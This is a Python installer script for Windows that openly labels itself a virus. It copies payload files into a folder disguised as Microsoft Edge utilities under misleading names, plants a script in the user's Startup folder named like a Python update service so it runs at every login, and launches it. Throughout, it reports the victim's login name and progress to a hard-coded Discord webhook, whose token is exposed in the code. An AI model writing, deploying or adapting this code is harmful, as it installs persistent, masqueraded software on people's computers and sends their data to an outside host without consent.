import os, sys, shutil, requests
PYTHON_COMMAND = sys.executable

if sys.platform != "win32":
    print("This is ment for windows only. \nExiting...")
    exit(1)

def log_to_discord(msg:str):
    data = {"username":f"User:{os.getlogin()}", "content":msg}
    try:
        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
    except:
        print("Failed to send port request")

log_to_discord("Installing of virus...")

home_dir = os.path.expanduser("~")
startup_folder = os.path.join(
    home_dir,
    "AppData",
    "Roaming",
    "Microsoft",
    "Windows",
    "Start Menu",
    "Programs",
    "Startup"
)

curr_location = os.path.dirname(__file__)
shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
appdata = os.environ['APPDATA']

virus_dir = os.path.join(
    home_dir,
    ".temp",
    "Microsoft_Edge_x64",
    "utils"
)
os.makedirs(virus_dir, exist_ok=True)

file_table = [
    (os.path.join(curr_location, "file_checker.py"), os.path.join(virus_dir, "cleaner_x32.py")),
    (os.path.join(curr_location, "youtube_com-watch-dQw4w9WgXcQ.mp3"), os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")),
    (os.path.join(curr_location, "gama_aaa.py"), os.path.join(virus_dir, "cleanup_x64.py")),
    (os.path.join(curr_location, "startup.py"), os.path.join(shell_startup_dir, "python_executable_update_service.py"))
]

for source, dest in file_table:
    dest_dir = os.path.dirname(dest)
    os.makedirs(dest_dir, exist_ok=True)
    shutil.copy(source, dest)
    print(f"Copied {source} to {dest}.")


log_to_discord("Virus installed successfuly. Running it...")

print("Starting virus...")
startup_script = os.path.join(shell_startup_dir, "python_executable_update_service.py")
import subprocess
subprocess.Popen([PYTHON_COMMAND, startup_script])